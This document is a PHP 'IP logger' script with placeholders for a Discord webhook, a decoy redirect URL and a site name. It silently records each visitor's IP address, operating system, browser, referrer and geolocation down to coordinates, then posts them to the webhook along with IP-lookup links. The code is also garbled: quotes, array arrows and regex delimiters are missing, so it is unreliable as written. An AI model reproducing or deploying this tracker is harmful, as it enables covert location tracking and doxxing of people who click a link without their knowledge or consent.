<?php

$webhook = "WEBHOOKURL" ------ DISCORD WEBHOOK HERE
$redirect = "URL";  ---- WHERE YOUR SITE WILL REDIRECT AFTER USAGE
$site_name = "NAME"; ---- THE NAME OF THE EMBED

// DON'T EDIT ANYTHING UNDER HERE.
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

header(Location $redirect);
function getOS() {
    global $user_agent;
    $os_platform    =   Unknown OS;
    $os_array       =   array(
                            'windows nt 10i'      =  'Windows 10',
                            'windows nt 6.3i'     =  'Windows 8.1',
                            'windows nt 6.2i'     =  'Windows 8',
                            'windows nt 6.1i'     =  'Windows 7',
                            'windows nt 6.0i'     =  'Windows Vista',
                            'windows nt 5.2i'     =  'Windows Server 2003XP x64',
                            'windows nt 5.1i'     =  'Windows XP',
                            'windows xpi'         =  'Windows XP',
                            'windows nt 5.0i'     =  'Windows 2000',
                            'windows mei'         =  'Windows ME',
                            'win98i'              =  'Windows 98',
                            'win95i'              =  'Windows 95',
                            'win16i'              =  'Windows 3.11',
                            'macintoshmac os xi'  =  'Mac OS X',
                            'mac_powerpci'        =  'Mac OS 9',
                            'linuxi'              =  'Linux',
			    'kalilinuxi'          =  'KaliLinux',
                            'ubuntui'             =  'Ubuntu',
                            'iphonei'             =  'iPhone',
                            'ipodi'               =  'iPod',
                            'ipadi'               =  'iPad',
                            'androidi'            =  'Android',
                            'blackberryi'         =  'BlackBerry',
                            'webosi'              =  'Mobile',
			    'Windows Phonei'      =  'Windows Phone'
                        );
    foreach ($os_array as $regex = $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}
function getBrowser() {
    global $user_agent;
    $browser        =   Unknown Browser;
    $browser_array  =   array(
                            'msiei'       =  'Internet Explorer',
                            'firefoxi'    =  'Firefox',
			    'Mozillai'	  =  'Mozila',
			    'Mozilla5.0i' =  'Mozila',
                            'safarii'     =  'Safari',
                            'chromei'     =  'Chrome',
                            'edgei'       =  'Edge',
                            'operai'      =  'Opera',
			    'OPRi'        =  'Opera',
                            'netscapei'   =  'Netscape',
                            'maxthoni'    =  'Maxthon',
                            'konquerori'  =  'Konqueror',
			    'Boti'	  =	'Robot',
			    'Valve Steam GameOverlayi'  =  'Steam',
                            'mobilei'     =  'Mobile'
                        );
    foreach ($browser_array as $regex = $value) {
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$user_os        =   getOS();
$user_browser   =   getBrowser();

$ip = $_SERVER['REMOTE_ADDR'];

$site_refer = $_SERVER['HTTP_REFERER'];
	if($site_refer == ){
		$site = dirrect connection;
	}
else{
		$site = $site_refer;
	}

$ip_address=$_SERVER['REMOTE_ADDR'];
//Get user ip address details with geoplugin.net
$geopluginURL='http://www.geoplugin.net/php.gp?ip='.$ip_address;
$addrDetailsArr = unserialize(file_get_contents($geopluginURL));
//Get City name by return array
$city = $addrDetailsArr['geoplugin_city'];
//Get Country name by return array
$country = $addrDetailsArr['geoplugin_countryName'];
$state = $addrDetailsArr['geoplugin_regionCode'];
$long = $addrDetailsArr['geoplugin_longitude'];
$lat = $addrDetailsArr['geoplugin_latitude'];
$currency_code = $addrDetailsArr['geoplugin_currencyCode'];
$currency_symbol = $addrDetailsArr['geoplugin_currencySymbol'];
$ping = $addrDetailsArr['geoplugin_delay'];

$whatmyipaddress = https://whatismyipaddress.com/ip/$ip;
$checkhost = https://check-host.net/check-ping/host=$ip;
//Comment out these line to see all the posible details
echo 'pre';
print_r($addrDetailsArr);
die();




date_default_timezone_set('$timezonehere');
$time = date('Y-m-d His');
if ($user_browser == Robot) {
    $make_json = json_encode(array ('content'=));
}
else {
  $make_json = json_encode([
    content = $tags_hvh,
  embeds = [
      [
           //Set the title for your embed
          title = $site_name Main Logs,

          // The type of your embed, will ALWAYS be rich
          type = rich,

        //   A description for your embed
          description = ,

          // The URL of where your title will be a link to
          url = $redirect,

          // A timestamp to be displayed below the embed, IE for when an an article was posted
          //  This must be formatted as ISO8601


          // The integer color to be used on the left side of the embed
          color = hexdec( FFFFFF ),

         //  Footer object
          footer = [
              text = "Logged at: $time"
              icon_url = "https://www.creativefabrica.com/wp-content/uploads/2019/02/Monogram-IP-Logo-Design-by-Greenlines-Studios.jpg"
          ],
          // Field array of objects
          fields = [
               Field 1
              [
                  name = IP,
                  value = $ip,
                  inline = true
              ],
               Field 2
              [
                  name = Ping,
                  value = $ping,
                  inline = true
              ],
               Field 3
              [
                  name = Operating System,
                  value = $user_os,
                  inline = true
              ],
              [
                  name = Browser,
                  value = $user_browser,
                  inline = true
              ],
               Field 2
              [
                  name = Location,
                  value = $city, $state, $country,
                  inline = true
              ],
               Field 3
              [
                  name = Coordinates,
                  value = $lat, $long,
                  inline = true
              ],
              [
                  name = Check Host,
                  value = [Here](https://check-host.net/check-ping/host=$ip),
                  inline = true
              ],
               Field 3
              [
                  name = IP Lookup,
                  value = [Here](https://whatismyipaddress.com/ip/$ip),
                  inline = true
              ]
          ]
      ]
  ]
], JSON_UNESCAPED_SLASHES  JSON_UNESCAPED_UNICODE );
}

$exec = curl_init($webhook);
curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type applicationjson'));
curl_setopt( $exec, CURLOPT_POST, 1);
curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $exec, CURLOPT_HEADER, 0);
curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $exec );
